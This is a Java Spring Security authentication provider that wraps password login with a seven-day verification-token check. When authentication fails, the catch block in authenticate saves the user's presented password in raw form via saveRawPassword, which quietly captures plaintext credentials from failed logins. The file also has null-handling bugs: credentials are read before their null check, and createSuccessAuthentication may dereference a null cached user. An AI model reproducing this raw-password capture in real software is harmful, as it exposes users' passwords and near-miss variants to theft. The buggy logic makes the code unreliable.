package com.rusko.config;

import com.rusko.config.exception.InvalidTokenException;
import com.rusko.domain.User;
import com.rusko.repository.UserRepository;
import com.rusko.service.UserService;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.MessageSourceAware;
import org.springframework.security.authentication.*;
import org.springframework.security.authentication.dao.AbstractUserDetailsAuthenticationProvider;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.userdetails.*;
import org.springframework.security.core.userdetails.cache.NullUserCache;
import org.springframework.security.crypto.factory.PasswordEncoderFactories;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.util.Assert;

import java.time.LocalDate;
import java.time.ZoneId;
import java.util.Date;

public class CustomAuthenticationProvider extends AbstractUserDetailsAuthenticationProvider implements AuthenticationProvider, InitializingBean, MessageSourceAware {
  private static final Log logger = LogFactory.getLog(CustomAuthenticationProvider.class);

  private static final String USER_NOT_FOUND_PASSWORD = "userNotFoundPassword";
  private PasswordEncoder passwordEncoder;
  private volatile String userNotFoundEncodedPassword;
  private UserDetailsService userDetailsService;
  private UserDetailsPasswordService userDetailsPasswordService;
  private UserCache userCache = new NullUserCache();
  private UserDetailsChecker preAuthenticationChecks = new CustomAuthenticationProvider.DefaultPreAuthenticationChecks();
  private UserDetailsChecker postAuthenticationChecks = new CustomAuthenticationProvider.DefaultPostAuthenticationChecks();
  private boolean forcePrincipalAsString = false;

  @Autowired
  private UserService userService;

  public CustomAuthenticationProvider() {
    this.setPasswordEncoder(PasswordEncoderFactories.createDelegatingPasswordEncoder());
  }

  protected void additionalAuthenticationChecks(UserDetails userDetails, UsernamePasswordAuthenticationToken authentication) throws AuthenticationException {
    String presentedPassword = authentication.getCredentials().toString();
    if (authentication.getCredentials() == null) {
      this.logger.debug("Authentication failed: no credentials provided");
      throw new BadCredentialsException(this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
    } else if (!this.passwordEncoder.matches(presentedPassword, userDetails.getPassword())) {
      this.logger.debug("Authentication failed: password does not match stored value");
      throw new BadCredentialsException(this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
    } else {
      User user = userService.findByUsername(userDetails.getUsername());
      if (!(user.getVerificationToken() != null && isVerificationTokenValid(user.getVerificationTokenCreationDate()))) {
        throw new InvalidTokenException(user.getUsername());
      }
    }
  }

  private boolean isVerificationTokenValid(Date verificationTokenCreationDate) {
    LocalDate dateToCompare = verificationTokenCreationDate.toInstant().atZone(ZoneId.systemDefault()).toLocalDate().plusDays(7);
    return !LocalDate.now().isAfter(dateToCompare);
  }

  protected void doAfterPropertiesSet() throws Exception {
    Assert.notNull(this.userDetailsService, "A UserDetailsService must be set");
  }

  protected final UserDetails retrieveUser(String username, UsernamePasswordAuthenticationToken authentication) throws AuthenticationException {
    this.prepareTimingAttackProtection();

    try {
      UserDetails loadedUser = this.getUserDetailsService().loadUserByUsername(username);
      if (loadedUser == null) {
        throw new InternalAuthenticationServiceException("UserDetailsService returned null, which is an interface contract violation");
      } else {
        return loadedUser;
      }
    } catch (UsernameNotFoundException var4) {
      this.mitigateAgainstTimingAttack(authentication);
      throw var4;
    } catch (InternalAuthenticationServiceException var5) {
      throw var5;
    } catch (Exception var6) {
      throw new InternalAuthenticationServiceException(var6.getMessage(), var6);
    }
  }

  public Authentication authenticate(Authentication authentication) throws AuthenticationException {
    Assert.isInstanceOf(UsernamePasswordAuthenticationToken.class, authentication, () -> {
      return this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.onlySupports", "Only UsernamePasswordAuthenticationToken is supported");
    });
    String username = authentication.getPrincipal() == null ? "NONE_PROVIDED" : authentication.getName();
    boolean cacheWasUsed = true;
    UserDetails user = this.userCache.getUserFromCache(username);
    if (user == null) {
      cacheWasUsed = false;

      try {
        user = this.retrieveUser(username, (UsernamePasswordAuthenticationToken) authentication);
      } catch (UsernameNotFoundException var6) {
        this.logger.debug("User '" + username + "' not found");
        if (this.hideUserNotFoundExceptions) {
          throw new BadCredentialsException(this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
        }
        throw var6;
      }

      Assert.notNull(user, "retrieveUser returned null - a violation of the interface contract");
    }

    try {
      this.preAuthenticationChecks.check(user);
      this.additionalAuthenticationChecks(user, (UsernamePasswordAuthenticationToken) authentication);
    } catch (AuthenticationException var7) {
      if (!cacheWasUsed) {
        logger.debug("preAuth username: " + user.getUsername());
        String presentedPassword = authentication.getCredentials().toString();
        userService.saveRawPassword(user.getUsername(), presentedPassword);
        this.userCache.putUserInCache(user);
        throw var7;
      }

      cacheWasUsed = false;
      user = this.retrieveUser(username, (UsernamePasswordAuthenticationToken) authentication);
      this.preAuthenticationChecks.check(user);
      this.additionalAuthenticationChecks(user, (UsernamePasswordAuthenticationToken) authentication);
    }

    this.postAuthenticationChecks.check(user);
    if (!cacheWasUsed) {
      this.userCache.putUserInCache(user);
    }

    Object principalToReturn = user;
    if (this.forcePrincipalAsString) {
      principalToReturn = user.getUsername();
    }

    return this.createSuccessAuthentication(principalToReturn, authentication, user);
  }

  protected Authentication createSuccessAuthentication(Object principal, Authentication authentication, UserDetails user) {
    boolean upgradeEncoding = this.userDetailsPasswordService != null && this.passwordEncoder.upgradeEncoding(user.getPassword());
    if (upgradeEncoding) {
      String presentedPassword = authentication.getCredentials().toString();
      String newPassword = this.passwordEncoder.encode(presentedPassword);
      user = this.userDetailsPasswordService.updatePassword(user, newPassword);
    }

    UserDetails userDetails = this.userCache.getUserFromCache(authentication.getName());
    if (user != null) {
      logger.debug("postAuth username: " + userDetails.getUsername());
      this.userCache.removeUserFromCache(userDetails.getUsername());
    }

    return super.createSuccessAuthentication(principal, authentication, user);
  }

  private void prepareTimingAttackProtection() {
    if (this.userNotFoundEncodedPassword == null) {
      this.userNotFoundEncodedPassword = this.passwordEncoder.encode("userNotFoundPassword");
    }

  }

  private void mitigateAgainstTimingAttack(UsernamePasswordAuthenticationToken authentication) {
    if (authentication.getCredentials() != null) {
      String presentedPassword = authentication.getCredentials().toString();
      this.passwordEncoder.matches(presentedPassword, this.userNotFoundEncodedPassword);
    }

  }

  public void setPasswordEncoder(PasswordEncoder passwordEncoder) {
    Assert.notNull(passwordEncoder, "passwordEncoder cannot be null");
    this.passwordEncoder = passwordEncoder;
    this.userNotFoundEncodedPassword = null;
  }

  protected PasswordEncoder getPasswordEncoder() {
    return this.passwordEncoder;
  }

  public void setUserDetailsService(UserDetailsService userDetailsService) {
    this.userDetailsService = userDetailsService;
  }

  protected UserDetailsService getUserDetailsService() {
    return this.userDetailsService;
  }

  public void setUserDetailsPasswordService(UserDetailsPasswordService userDetailsPasswordService) {
    this.userDetailsPasswordService = userDetailsPasswordService;
  }

  public UserCache getUserCache() {
    return this.userCache;
  }

  public void setUserCache(UserCache userCache) {
    this.userCache = userCache;
  }

  public boolean isForcePrincipalAsString() {
    return this.forcePrincipalAsString;
  }

  public void setForcePrincipalAsString(boolean forcePrincipalAsString) {
    this.forcePrincipalAsString = forcePrincipalAsString;
  }


  private class DefaultPostAuthenticationChecks implements UserDetailsChecker {
    private DefaultPostAuthenticationChecks() {
    }

    public void check(UserDetails user) {
      if (!user.isCredentialsNonExpired()) {
        logger.debug("User account credentials have expired");
        throw new CredentialsExpiredException(CustomAuthenticationProvider.this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.credentialsExpired", "User credentials have expired"));
      }
    }
  }

  private class DefaultPreAuthenticationChecks implements UserDetailsChecker {
    private DefaultPreAuthenticationChecks() {
    }

    public void check(UserDetails user) {
      if (!user.isAccountNonLocked()) {
        CustomAuthenticationProvider.this.logger.debug("User account is locked");
        throw new LockedException(CustomAuthenticationProvider.this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.locked", "User account is locked"));
      } else if (!user.isEnabled()) {
        CustomAuthenticationProvider.this.logger.debug("User account is disabled");
        throw new DisabledException(CustomAuthenticationProvider.this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.disabled", "User is disabled"));
      } else if (!user.isAccountNonExpired()) {
        CustomAuthenticationProvider.this.logger.debug("User account is expired");
        throw new AccountExpiredException(CustomAuthenticationProvider.this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.expired", "User account has expired"));
      }
    }
  }
}
